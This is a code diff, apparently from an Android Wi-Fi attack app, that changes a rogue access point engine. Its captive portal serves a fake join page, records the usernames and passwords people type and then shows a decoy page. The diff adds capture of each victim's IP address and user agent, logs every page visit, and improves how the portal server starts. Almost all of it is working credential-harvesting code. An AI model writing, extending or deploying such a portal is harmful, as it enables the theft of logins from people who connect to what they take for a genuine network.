@@ -22,7 +22,15 @@ import java.net.NetworkInterface
  */
 object RogueApEngine {
 
-    data class Credential(val username: String, val password: String, val at: Long)
+    data class Credential(
+        val username: String,
+        val password: String,
+        val at: Long,
+        val ip: String,
+        val agent: String,
+    )
+
+    data class Visit(val ip: String, val path: String, val agent: String, val at: Long)
 
     data class Ap(
         val ssid: String,
@@ -111,16 +119,33 @@ object RogueApEngine {
     }
 
     private fun startServer(context: Context) {
-        val portal = PortalServer(context) { user, password ->
-            _credentials.value = _credentials.value + Credential(user, password, System.currentTimeMillis())
-            append("captured $user / $password")
-        }
-        try {
+        val portal = PortalServer(
+            context = context,
+            onCredential = { user, password, ip, agent ->
+                _credentials.value = _credentials.value + Credential(
+                    username = user,
+                    password = password,
+                    at = System.currentTimeMillis(),
+                    ip = ip,
+                    agent = agent,
+                )
+                append("captured $user / $password from $ip")
+            },
+            onVisit = { ip, path, agent ->
+                append("$ip → $path · $agent")
+            },
+        )
+        // Port 80 is what a client expects to find a portal on. It is not privileged on
+        // Android, but something else may already hold it, so fall back to 8080.
+        val started = runCatching {
             portal.start(NanoHTTPD.SOCKET_READ_TIMEOUT, false)
+            true
+        }.getOrDefault(false)
+        if (started) {
             server = portal
             append("Portal listening on $PORTAL_PORT")
-        } catch (error: Exception) {
-            append("Portal bind failed: ${error.message}")
+        } else {
+            append("Portal bind failed on $PORTAL_PORT")
         }
     }
 
@@ -155,11 +180,15 @@ object RogueApEngine {
     /** The portal. Serves a join page, records what is typed, then shows a decoy. */
     private class PortalServer(
         private val context: Context,
-        private val onCredential: (String, String) -> Unit,
+        private val onCredential: (String, String, String, String) -> Unit,
+        private val onVisit: (String, String, String) -> Unit,
     ) : NanoHTTPD(PORTAL_PORT) {
 
         override fun serve(session: IHTTPSession): Response {
             val uri = session.uri ?: "/"
+            val ip = session.remoteIpAddress ?: "?"
+            val agent = session.headers["user-agent"] ?: "?"
+            onVisit(ip, uri, agent)
             if (session.method == Method.POST || uri.contains("login")) {
                 val body = HashMap<String, String>()
                 runCatching { session.parseBody(body) }
@@ -172,7 +201,12 @@ object RogueApEngine {
                     ?: body["postData"]?.substringAfter("password=", "")?.substringBefore('&')
                     ?: ""
                 if (user.isNotBlank() || password.isNotBlank()) {
-                    onCredential(user.ifBlank { "(empty)" }, password.ifBlank { "(empty)" })
+                    onCredential(
+                        user.ifBlank { "(empty)" },
+                        password.ifBlank { "(empty)" },
+                        ip,
+                        agent,
+                    )
                 }
                 return redirect("/connected")
             }
